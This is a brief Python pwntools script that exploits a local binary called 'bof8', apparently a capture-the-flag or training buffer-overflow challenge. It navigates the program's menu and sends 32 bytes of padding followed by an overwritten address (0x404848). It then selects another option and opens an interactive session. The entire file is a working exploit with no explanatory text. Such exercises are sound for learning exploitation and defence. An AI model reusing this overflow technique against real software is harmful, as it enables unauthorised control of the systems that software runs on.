#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./bof8', checksec=False)
p = process(exe.path)
input()
p.sendlineafter(b'> ', b'1')
payload = b'a'*32
payload +=  p64(0x404848)
p.sendafter(b'> ', payload)

p.sendlineafter(b'> ', b'3')
p.interactive()
